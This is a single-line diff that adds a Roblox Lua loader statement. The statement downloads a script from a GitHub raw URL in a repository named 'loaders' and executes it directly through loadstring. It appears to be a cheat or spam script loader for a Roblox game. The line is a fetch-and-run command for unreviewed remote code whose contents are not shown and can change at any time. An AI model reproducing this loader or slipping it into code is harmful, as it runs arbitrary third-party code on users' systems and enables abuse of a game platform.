@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/7-days-cat-sitting-spam4-87m9a178f7ndsj.lua"))()
